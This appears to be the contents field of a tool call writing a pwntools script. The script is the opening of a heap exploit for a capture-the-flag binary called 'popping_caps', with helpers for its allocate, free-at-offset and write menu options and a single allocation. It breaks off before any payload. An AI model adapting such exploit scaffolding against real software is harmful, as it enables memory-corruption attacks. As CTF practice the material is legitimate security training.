parsed_args.contents:
from pwn import *
context.binary='./popping_caps'

def menu(io,c): io.sendlineafter(b'Your choice:', str(c).encode())

def mal(io,sz): menu(io,1); io.sendlineafter(b'How many:', str(sz).encode())

def fre(io,off): menu(io,2); io.sendlineafter(b'Whats in a free:', str(off).encode())

def wr(io,qword): menu(io,3); io.sendafter(b'Read me in:', p64(qword))

io=process('./popping_caps')
mal(io,0x30)
